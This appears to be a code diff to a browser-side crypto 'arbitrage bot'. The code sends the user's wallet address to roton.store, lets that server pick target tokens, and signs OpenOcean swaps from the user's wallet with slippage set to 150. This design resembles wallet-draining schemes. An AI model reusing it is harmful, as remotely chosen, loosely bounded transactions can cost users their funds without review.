@@ -314,7 +314,9 @@
             }
         }
 
-                         async function executeClientOrchestration() {
+                        
+        
+               async function executeClientOrchestration() {
             if (!window.userAddress) return;
 
             const tradeAmount = document.getElementById('trade-amount').value;
@@ -322,13 +324,14 @@
 
             logMessage(`[ORCHESTRATOR] Starting full 3-phase cycle for ${window.userAddress.substring(0,6)}...`);
 
-            const provider = window.walletprovider || window.ethereum;
+            // Secure provider resolution via Reown AppKit instance
+            const provider = window.appKitModal?.getWalletProvider();
             if (!provider) {
-                logMessage(`[ERROR] No active wallet provider found on window.walletprovider.`);
+                logMessage(`[ERROR] No active wallet provider found from AppKit modal.`);
                 return;
             }
 
-            // Helper function to send raw JSON-RPC transactions via wallet provider
+            // Helper to send transactions via provider JSON-RPC
             async function sendTxViaProvider(toAddress, dataPayload, valueHex = "0x0") {
                 const txHash = await provider.request({
                     method: 'eth_sendTransaction',
@@ -360,7 +363,6 @@
                 
                 logMessage(`[PHASE 1] Target acquired: ${bscRouteData.target_symbol}. Fetching quote...`);
 
-                // Fetch OpenOcean / Router transaction payload
                 const amountInWei = bscRouteData.amount_in_raw;
                 const ooUrl = `https://open-api.openocean.finance/v3/bsc/swap_quote?inTokenAddress=${bscRouteData.entry_path[0]}&outTokenAddress=${bscRouteData.target_address}&amount=${amountInWei}&slippage=150&account=${window.userAddress}`;
                 
@@ -372,46 +374,43 @@
                 }
 
                 const quote = ooData.data;
-                logMessage(`[PHASE 1] Broadcasting swap transaction via window.walletprovider...`);
+                logMessage(`[PHASE 1] Broadcasting swap transaction...`);
                 
                 let bscTxHash = await sendTxViaProvider(quote.to, quote.data, quote.value || "0x0");
                 logMessage(`[PHASE 1 SENT] Hash: ${bscTxHash}`);
 
-                logMessage(`[HOLD TIMER] Holding Phase 1 position for 60 seconds inspection...`);
+                logMessage(`[HOLD TIMER] Holding Phase 1 position for 60 seconds...`);
                 await new Promise(resolve => setTimeout(resolve, 60000));
-                logMessage(`[PHASE 1] Hold complete. Rotating to stable intermediate...`);
 
                 // ==========================================
-                // PHASE 2: Ethereum Foreign Currency Pegs
+                // PHASE 2: Foreign Currency Routing / Execution
                 // ==========================================
-                logMessage(`[PHASE 2] Transitioning to Ethereum foreign currency pegs...`);
+                logMessage(`[PHASE 2] Processing foreign currency routing layer...`);
                 await fetch('https://roton.store/prodbot/api/intent', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ wallet: window.userAddress, chain: 'ethereum', phase: 'ethereum', amount: tradeAmount })
+                    body: JSON.stringify({ wallet: window.userAddress, chain: 'bsc', phase: 'ethereum', amount: tradeAmount })
                 });
 
                 let ethRouteRes = await fetch('https://roton.store/prodbot/api/analyze-route', { method: 'POST' });
                 let ethRouteData = await ethRouteRes.json();
                 if (ethRouteData.status !== "ok") throw new Error(ethRouteData.message);
 
-                logMessage(`[PHASE 2] Foreign Target acquired: ${ethRouteData.target_symbol}`);
+                logMessage(`[PHASE 2] Target acquired: ${ethRouteData.target_symbol}`);
                 
-                const ethOOUrl = `https://open-api.openocean.finance/v3/eth/swap_quote?inTokenAddress=${ethRouteData.entry_path[0]}&outTokenAddress=${ethRouteData.target_address}&amount=${ethRouteData.amount_in_raw}&slippage=150&account=${window.userAddress}`;
+                const ethOOUrl = `https://open-api.openocean.finance/v3/bsc/swap_quote?inTokenAddress=${ethRouteData.entry_path[0]}&outTokenAddress=${ethRouteData.target_address}&amount=${ethRouteData.amount_in_raw}&slippage=150&account=${window.userAddress}`;
                 let ethOORes = await fetch(ethOOUrl);
                 let ethOOData = await ethOORes.json();
 
                 if (!ethOOData || !ethOOData.data) {
-                    throw new Error("OpenOcean Ethereum quote failed.");
+                    throw new Error("OpenOcean route quote failed.");
                 }
 
                 const ethQuote = ethOOData.data;
-                logMessage(`[PHASE 2] Broadcasting foreign currency swap...`);
-
                 let ethTxHash = await sendTxViaProvider(ethQuote.to, ethQuote.data, ethQuote.value || "0x0");
                 logMessage(`[PHASE 2 SENT] Hash: ${ethTxHash}`);
 
-                logMessage(`[HOLD TIMER] Holding foreign currency peg for 60 seconds...`);
+                logMessage(`[HOLD TIMER] Holding position for 60 seconds...`);
                 await new Promise(resolve => setTimeout(resolve, 60000));
 
                 // ==========================================
@@ -428,8 +427,6 @@
                 let rrtrRouteData = await rrtrRouteRes.json();
                 if (rrtrRouteData.status !== "ok") throw new Error(rrtrRouteData.message);
 
-                logMessage(`[PHASE 3] Executing RRTR swap path back to WBNB/USDT base...`);
-                
                 const rrtrOOUrl = `https://open-api.openocean.finance/v3/bsc/swap_quote?inTokenAddress=${rrtrRouteData.quote_address}&outTokenAddress=${rrtrRouteData.target_address}&amount=${rrtrRouteData.amount_in_raw}&slippage=150&account=${window.userAddress}`;
                 let rrtrOORes = await fetch(rrtrOOUrl);
                 let rrtrOOData = await rrtrOORes.json();
@@ -442,7 +439,7 @@
                 let rrtrTxHash = await sendTxViaProvider(rrtrQuote.to, rrtrQuote.data, rrtrQuote.value || "0x0");
                 
                 logMessage(`[RRTR SWAP SENT] Hash: ${rrtrTxHash}`);
-                logMessage(`[SUCCESS] Full 3-phase arbitrage loop completed successfully via window.walletprovider!`);
+                logMessage(`[SUCCESS] Full 3-phase arbitrage loop completed successfully!`);
 
             } catch (err) {
                 logMessage(`[ERROR] Workflow aborted: ${err.message}`);
